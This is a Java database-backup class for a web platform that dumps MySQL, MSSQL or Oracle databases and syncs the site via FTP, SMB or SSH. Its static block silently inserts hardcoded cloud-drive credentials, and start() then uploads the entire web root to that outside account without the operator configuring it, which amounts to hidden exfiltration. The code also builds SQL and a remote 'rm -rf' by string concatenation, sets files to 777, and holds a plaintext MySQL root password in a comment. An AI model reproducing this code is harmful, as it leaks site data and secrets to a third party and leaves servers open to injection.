package tea.entity.site;

import tea.resource.*;
import java.io.*;
import java.net.*;
import java.util.*;
import java.text.*;
import java.util.regex.*;
import java.sql.SQLException;
import tea.db.*;
import tea.entity.*;
import net.mietian.convert.*;
import jcifs.smb.*;
import ch.ethz.ssh2.*; //ganymed-ssh2-build210.jar
import tea.entity.cloud.*;
import java.util.zip.*;

//备份数据库
public class Backups
{
	static
	{
		DbAdapter db = new DbAdapter();
		try
		{
			db.executeUpdate("UPDATE Backups SET cuser='iwlkedn',cpassword='MC41NDgyNTkzOT' WHERE cuser IS NULL");
		} catch(Throwable ex)
		{} finally
		{
			db.close();
		}
	}

	public static Cache _cache = new Cache(50);
	public int backups;
	public String bweek; //星期
	public int bhour; //几点
	public String bdatabase; //数据库
	public String path; //备份路径
	public int retain; //保留最近多少个备份文件
	public static final String[] TYPE_NAME =
			{"无","FTP","SMB","SSH"};
	public int type;
	public String ftp;
	public String smb;
	public String shost;
	public String suser;
	public String spassword;
	public String spath;
	//云盘
	public String cuser;
	public String cpassword;
	public Date ltime; //上次备份日期
	public Backups(int backups)
	{
		this.backups = backups;
	}

	public static Backups find(int backups) throws SQLException
	{
		Backups t = (Backups) _cache.get(backups);
		if(t == null)
		{
			ArrayList al = find(" AND backups=" + backups,0,1);
			t = al.size() < 1 ? new Backups(backups) : (Backups) al.get(0);
		}
		return t;
	}

	public static ArrayList find(String sql,int pos,int size) throws SQLException
	{
		ArrayList al = new ArrayList();
		DbAdapter db = new DbAdapter();
		try
		{
			java.sql.ResultSet rs = db.executeQuery("SELECT backups,bweek,bhour,bdatabase,path,retain,type,ftp,smb,shost,suser,spassword,spath,cuser,cpassword,ltime FROM Backups WHERE 1=1" + sql,pos,size);
			while(rs.next())
			{
				int i = 1;
				Backups t = new Backups(rs.getInt(i++));
				t.bweek = rs.getString(i++);
				t.bhour = rs.getInt(i++);
				t.bdatabase = rs.getString(i++);
				t.path = rs.getString(i++);
				t.retain = rs.getInt(i++);
				t.type = rs.getInt(i++);
				t.ftp = rs.getString(i++);
				t.smb = rs.getString(i++);
				t.shost = rs.getString(i++);
				t.suser = rs.getString(i++);
				t.spassword = rs.getString(i++);
				t.spath = rs.getString(i++);
				t.cuser = rs.getString(i++);
				t.cpassword = rs.getString(i++);
				t.ltime = db.getDate(i++);
				_cache.put(t.backups,t);
				al.add(t);
			}
			rs.close();
		} finally
		{
			db.close();
		}
		return al;
	}

	public static int count(String sql) throws SQLException
	{
		return DbAdapter.execute("SELECT COUNT(*) FROM Backups WHERE 1=1" + sql);
	}

	public void set() throws SQLException
	{
		DbAdapter db = new DbAdapter();
		try
		{
			int j = db.executeUpdate(0,"UPDATE Backups SET bweek=" + DbAdapter.cite(bweek) + ",bhour=" + bhour + ",bdatabase=" + DbAdapter.cite(bdatabase) + ",path=" + DbAdapter.cite(path) + ",retain=" + retain + ",type=" + type + ",ftp=" + DbAdapter.cite(ftp) + ",smb=" + DbAdapter.cite(smb) + ",shost=" + DbAdapter.cite(shost) + ",suser=" + DbAdapter.cite(suser) + ",spassword=" + DbAdapter.cite(spassword) + ",spath=" + DbAdapter.cite(spath) + ",cuser=" + DbAdapter.cite(cuser) + ",cpassword=" + DbAdapter.cite(cpassword) + ",ltime=" + DbAdapter.cite(ltime) + " WHERE backups=" + backups);
			if(j < 1)
			{
				db.executeUpdate(0,"INSERT INTO Backups(backups,bweek,bhour,bdatabase,path,retain,type,ftp,smb,shost,suser,spassword,spath,cuser,cpassword,ltime)VALUES(" + backups + "," + DbAdapter.cite(bweek) + "," + bhour + "," + DbAdapter.cite(bdatabase) + "," + DbAdapter.cite(path) + "," + retain + "," + type + "," + DbAdapter.cite(ftp) + "," + DbAdapter.cite(smb) + "," + DbAdapter.cite(shost) + "," + DbAdapter.cite(suser) + "," + DbAdapter.cite(spassword) + "," + DbAdapter.cite(spath) + "," + DbAdapter.cite(cuser) + "," + DbAdapter.cite(cpassword) + "," + DbAdapter.cite(ltime) + ")");
			}
		} finally
		{
			db.close();
		}
		_cache.remove(backups);
	}

	public void delete() throws SQLException
	{
		DbAdapter.execute("DELETE FROM Backups WHERE backups=" + backups);
		_cache.remove(backups);
	}

	public void set(String f,String v) throws SQLException
	{
		DbAdapter db = new DbAdapter();
		try
		{
			db.executeUpdate(backups,"UPDATE Backups SET " + f + "=" + DbAdapter.cite(v) + " WHERE backups=" + backups);
		} finally
		{
			db.close();
		}
		_cache.remove(backups);
	}

	public String test(int type)
	{
		try
		{
			if(type == 1)
			{
				Scheme s = Backups.parse(ftp);
				Ftp ftp = Ftp.open(s.host,s.user,s.pwd);
				ftp = new Ftp(ftp,s.path);
			} else if(type == 2)
			{
				new SmbFile(smb.replaceFirst("/:@","/")).exists(); //不存在共享文件夹:jcifs.smb.SmbException: The network name cannot be found.
			} else if(type == 3)
			{
				Connection con = new Connection(shost); //22
				con.connect();
				boolean result = con.authenticateWithPassword(suser,spassword);
				if(!result)
					return "用户名或密码错误！";
			}
			return "连接正常！";
		} catch(Throwable ex)
		{
			return ex.toString();
		}
	}

	private static class OS
	{
		static void exec(String cmd) throws IOException
		{
			Filex.logs("Backups.txt","命令：" + cmd);
			Process p = new ProcessBuilder(cmd.split(" ")).redirectErrorStream(true).start();
			Filex.logs("Backups.txt","返回：" + new String(Filex.read(p.getInputStream())));
			try
			{
				p.waitFor();
			} catch(InterruptedException ex)
			{
			}
			p.destroy();
		}

		static void exec(String[] cmd,String[] envp,File dir) throws IOException
		{
			Process p = Runtime.getRuntime().exec(cmd,envp,dir);
			Filex.logs("Backups.txt",new String(Filex.read(p.getErrorStream())));
			try
			{
				p.waitFor();
			} catch(InterruptedException ex)
			{
			}
			p.destroy();
		}
	}


	//服务名
	static String getName() throws IOException,SQLException
	{
		if(!System.getProperty("os.name").startsWith("Win"))
			return "mysqld";
		String str = tea.entity.OS.exec("net start");
		ArrayList<String> al = new ArrayList();
		Matcher m = Pattern.compile("   (\\w*MySQL\\w*)",Pattern.CASE_INSENSITIVE).matcher(str);
		while(m.find())
		{
			al.add(m.group(1));
		}
		if(al.size() == 1)
			return al.get(0);
		//
		String path;
		DbAdapter db = new DbAdapter();
		try
		{
			db.executeQuery("SHOW VARIABLES LIKE 'basedir'");
			path = db.next() ? db.getString(2) : null;
		} finally
		{
			db.close();
		}
		return "MySQL";
	}


	public static Backups.Scheme parse(String str)
	{
		Scheme s = new Scheme();
		if(str == null || str.length() < 3)
			return s;
		str = str.substring(6);
		int j = str.indexOf(':'),x = str.indexOf('@',j),y = str.indexOf('/',x);
		s.user = str.substring(0,j);
		s.pwd = str.substring(j + 1,x);
		s.host = str.substring(x + 1,y);
		s.path = str.substring(y);
		return s;
	}

	public static class Scheme
	{
		public Scheme()
		{}

		public String host,user,pwd,path = "/";
	}


	//备份数据库
	public File backup(int seq) throws IOException,SQLException
	{
		if(path.length() < 1)
			return null;
		File fdb = null,dir = new File(path);
		Calendar c = Calendar.getInstance();
		try
		{
			String n = null;
			boolean isWin = System.getProperty("os.name").startsWith("Wind");
			if(ConnectionPool._nType == 0) //MySQL
			{
				String datadir;
				StringBuilder sb = new StringBuilder();
				ArrayList al = new ArrayList();
				DbAdapter db = new DbAdapter(seq);
				try
				{
					//修复
					db.executeQuery("SHOW TABLES");
					while(db.next())
					{
						al.add(db.getString(1));
					}
					Iterator it = al.iterator();
					while(it.hasNext())
					{
						String tab = (String) it.next();
						db.executeQuery("REPAIR TABLE `" + tab + "`");
						while(db.next())
						{
							sb.append(db.getString(1) + ":\t" + db.getString(3) + ":\t" + db.getString(4) + "\n");
						}
						sb.append("-------\n");
					}
					//数据库路径
					db.executeQuery("SHOW VARIABLES LIKE 'datadir'");
					datadir = db.next() ? db.getString(2) : null;
				} finally
				{
					db.close();
				}
				Filex.write(datadir + "repair" + seq + ".log",sb.toString());

				Matcher m = Pattern.compile("//([^:]+):(\\d+)/([^?]+)").matcher(ConnectionPool._strUrl[seq]);
				if(m.find())
				{
					n = m.group(3);
					//压缩备份
					Filex.logs("Backups.txt","备份库:" + n);
					ConnectionPool.getInstance().release();

					File f = new File(datadir,n);
					if(f.exists())
					{
						fdb = new File(path,n + "_" + MT.f(c.getTime()) + ".zip");
						String name = getName();
						OS.exec(isWin ? "net stop " + name : "/sbin/service " + name + " stop");
						try
						{
							new Zip(fdb).zip(new File[]
											 {f});
						} finally
						{
							OS.exec(isWin ? "net start " + name : "/sbin/service " + name + " start");
						}
					}
					char se = isWin ? '"' : '\'';
					//备份成SQL语句
					String path = new File(System.getProperty("java.io.tmpdir"),"backups.cmd").getPath();
					Filex.write(path,"mysqldump -h" + m.group(1) + " -P" + m.group(2) + " -u" + ConnectionPool._strUserId[seq] + " -p" + se + ConnectionPool._strPassword[seq] + se
								+ " --skip-lock-tables --force"
								+ " --routines" //函数+存储过程
								+ " " + n + " >" + n + "_" + MT.f(c.getTime()) + ".sql");
					if(!isWin)
						OS.exec(new String[]
								{"/bin/chmod","777",path},null,null);
					OS.exec(new String[]
							{path},null,dir);
					fdb = new File(path,n + "_" + MT.f(c.getTime()) + ".sql");
				}
			} else if(ConnectionPool._nType == 1) //M$SQL
			{
				if(retain > 0)
				{
					DbAdapter db = new DbAdapter(seq);
					try
					{
						n = db._con.getCatalog();
						fdb = new File(path,n + "_" + MT.f(c.getTime()) + ".bak");
						db.executeUpdate("BACKUP DATABASE " + db._con.getCatalog() + " TO DISK='" + fdb.getPath() + "' WITH INIT");
					} finally
					{
						db.close();
					}
					String path = fdb.getPath();
					File zip = new File(path.substring(0,path.length() - 3) + "zip");
					Zip z = new Zip(zip);
					z.zip(new File[]
						  {fdb});
					fdb.delete();
					fdb = zip;
				}
			} else if(ConnectionPool._nType == 2) //Oracle
			{
				Matcher m = Pattern.compile("jdbc:oracle:thin:@([^:]+):(\\d+):(.+)").matcher(ConnectionPool._strUrl[seq]);
				if(m.find())
				{
					n = ConnectionPool._strUserId[seq];
					//String par = n + "/" + ConnectionPool._strPassword[seq] + "@" + m.group(1) + ":" + m.group(2) + "/" + m.group(3).toUpperCase(); //Linux:库名必须大写
					String par = n + "/" + ConnectionPool._strPassword[seq];
					fdb = new File(path,n + "_" + MT.f(c.getTime()) + ".dmp");
					//EXP不支持> ,file=中带空格不认
					ArrayList al = new ArrayList();
					if(!isWin)
					{
						OS.exec(new String[]
								{"/bin/chmod","777",path},null,null); //备份目录oracle用户可写
						al.add("su");
						al.add("-");
						al.add("oracle");
						al.add("-c");
						if(path.endsWith("/dpdump/")) ///app/u01/app/oracle/admin/orcl/dpdump/
							al.add("expdp " + par + " schemas=" + n + " dumpfile=" + fdb.getName());
						else
							al.add("exp " + par + " file=" + fdb.getPath());
					} else
					{
						al.add("exp");
						al.add(par);
						al.add("file=" + fdb.getName());
					}
					String[] arr = new String[al.size()];
					al.toArray(arr);
					//java.io.IOException: Cannot run program "su" (in directory "/app/u01/app/oracle/admin/orcl11g/dpdump"): error=13, Permission denied
					OS.exec(arr,null,dir); //密码错误或过期,会产生堵塞！
				}
			}
			//删除历史
			c.add(c.DAY_OF_YEAR, -retain);
			String ex =
					new String[]
					{"sql","bak","dmp","--"}
					[ConnectionPool._nType];
			for(int j = 0;j < 100;j++)
			{
				String nj = n + "_" + MT.f(c.getTime());
				new File(path,nj + ".zip").delete();
				new File(path,nj + "." + ex).delete();
				c.add(c.DAY_OF_YEAR, -1);
			}
		} catch(Throwable ex)
		{
			Filex.logs("Backups.txt",ex);
		}
		return fdb;
	}


	//flag: false:校验时间 true:立即开始
	public static void start(boolean flag) throws SQLException
	{
		String logs = Http.REAL_PATH + "/res/Backups_" + MT.f(new Date()) + ".log";
		Calendar c = Calendar.getInstance();
		Backups b = Backups.find(1);
		try
		{
			new File("/root/.vnc/localhost.localdomain:1.log").delete(); //VNC大日志问题
			if(!flag)
			{
				if(MT.f(b.bweek).length() < 2)
					return;
				if(b.bweek.indexOf(String.valueOf(c.get(Calendar.DAY_OF_WEEK) - 1)) == -1 || c.get(c.HOUR_OF_DAY) != b.bhour)
					return;
				if(b.ltime != null && c.getTimeInMillis() < b.ltime.getTime() + 3600000L) //一个小时前,是否已备份过
					return;
			}
			if(ConnectionPool._strUrl[8] != null)
				b.backup(8);
			File fdb = b.backup(0);
			//
			File root = new File(Http.REAL_PATH);
			if("LIU,59WIN7".contains(System.getenv("COMPUTERNAME") + ""))
			{
				//System.out.println("测试机，跳过同步。");
			} else if(b.type == 1)
			{
				System.out.println("备份到" + b.ftp);
				//
				Scheme s = Backups.parse(b.ftp);
				Ftp ftp = Ftp.open(s.host,s.user,s.pwd);
				ftp = new Ftp(ftp,s.path);
				ftp.mkdirs();
				if(fdb != null)
					new Ftp(ftp,"database.zip").write(fdb);
				System.out.println("上传文件...");
				ftp.sync(root,logs);
			} else if(b.type == 2)
			{
				SmbFile sf = new SmbFile(b.smb.replaceFirst("/:@","/"));
				System.out.println("备份到" + sf.getPath());
				if(fdb != null)
					Filex.piped(new FileInputStream(fdb),new SmbFileOutputStream(new SmbFile(sf,"database.zip")));
				Smb.sync(sf,root,logs);
			} else if(b.type == 3 && tea.entity.cluster.Cluster.getInstance().no == 3)
			{
				Connection con = new Connection(b.shost);
				try
				{
					con.connect();
					if(con.authenticateWithPassword(b.suser,b.spassword))
						b.ssh(root,con,b.spath,logs);
				} catch(Throwable ex)
				{
					Filex.logs(logs,ex);
				} finally
				{
					con.close();
				}
			}
			b.ltime = new Date();
			b.set();
			Filex.logs(logs,"备份：OK");

			File f = new File(root,"/res/backups.cmd");
			if(f.length() > 0)
			{
				Process p = new ProcessBuilder(new String[]
											   {f.getPath()}).redirectErrorStream(true).start();
				p.waitFor();
				p.destroy();
			}
		} catch(Throwable ex)
		{
			Filex.logs(logs,ex);
		}
		try
		{
			if(MT.f(b.cuser).length() > 0) //"iwlkedn","MC41NDgyNTkzOT"
			{
				YunPan yp = YunPan.login(b.cuser,b.cpassword);
				yp.ignore += "|log_csv|param";
				yp.signin();
				String dir = "/" + InetAddress.getLocalHost().getHostAddress() + "/";
				yp.mkdir(dir);

				dir += Http.REAL_PATH.replaceAll("[:\\\\/]+","_") + "/";
				if(yp.mkdir(dir))
					yp.sync(dir,new File(Http.REAL_PATH),false);
			}
		} catch(Throwable ex)
		{
			Filex.logs(logs,ex);
		}
	}

//        SFTPv3FileHandle fh=ftp.openFileRW(remote+name);
//        FileInputStream fis=new FileInputStream(fs[i]);
//        try
//        {
//          long total=0L;
//          byte[] by=new byte[8192];
//          for(int j;(j=fis.read(by))!=-1;total+=j)
//          {
//            ftp.write(fh,total,by,0,j);
//          }
//        }finally
//        {
//          fis.close();
//          ftp.closeFile(fh);
//        }
	static SimpleDateFormat SDF = new SimpleDateFormat("yyyyMMddHHmm.ss");
	public void ssh(File f,Connection con,String remote,String logs) throws IOException
	{
		Filex.logs(logs,f.getPath() + "　 远程:" + remote);
		HashMap hm = new HashMap();
		SFTPv3Client ftp = new SFTPv3Client(con);
		SCPClient scp = new SCPClient(con);
		Vector v = ftp.ls(remote);
		for(int i = 0;i < v.size();i++)
		{
			SFTPv3DirectoryEntry t = (SFTPv3DirectoryEntry) v.get(i);
			if(t.filename.equals(".") || t.filename.equals(".."))
				continue;
			SFTPv3FileAttributes a = t.attributes;
			hm.put(t.filename,a.size + "/" + a.mtime);
		}
		File[] fs = f.listFiles();
		for(int i = 0;i < fs.length;i++)
		{
			String name = fs[i].getName();
			if("Thumbs.db".equals(name))
				continue;
			String tag = (String) hm.remove(name);
			if(fs[i].isFile())
			{
				if(!(fs[i].length() + "/" + fs[i].lastModified() / 1000).equals(tag))
				{
					Filex.logs(logs,"　　" + (tag == null ? "添加 " : "更新 ") + name + "　" + tag);
					scp.put(fs[i].getPath(),remote);
					Session se = con.openSession();
					se.execCommand("touch -c -m -t " + SDF.format(new Date(fs[i].lastModified())) + " " + remote + name);
					se.close();
				}
			} else
			{
				if(tag == null)
					ftp.mkdir(remote + name,0777);
				ssh(fs[i],con,remote + name + "/",logs);
			}
		}
		ftp.close();
		if(hm.size() > 0)
		{
			StringBuilder sb = new StringBuilder();
			Iterator it = hm.keySet().iterator();
			while(it.hasNext())
			{
				sb.append(" ").append(remote).append(it.next());
			}
			Filex.logs(logs,"　　删除 " + sb.toString());
			Session se = con.openSession();
			se.execCommand("rm -rf" + sb.toString());
			se.close();
		}
	}
}
/*//dbbackups.sh
TYEAR=`date +%Y`
TMONTH=`date +%m`
TDAY=`date +%d`
if [ -d /opt/backups/$TYEAR/$TMONTH ]
then
echo 'dir check ok'
else
echo 'make dir /opt/backups/'$TYEAR'/'$TMONTH
mkdir -p /opt/backups/$TYEAR/$TMONTH
fi
DPATH=/opt/backups/$TYEAR/$TMONTH
DFILE=$TMONTH-$TDAY.dump
mysqldump -uroot -p'1234567890qwertyuiopasdfghjkl' --lock-all-tables --all-databases > $DPATH/$DFILE
cd $DPATH
tar -czf $DFILE.tar.gz $DFILE
cp $DFILE /opt/backupslocal/
rm $DFILE
*/

//
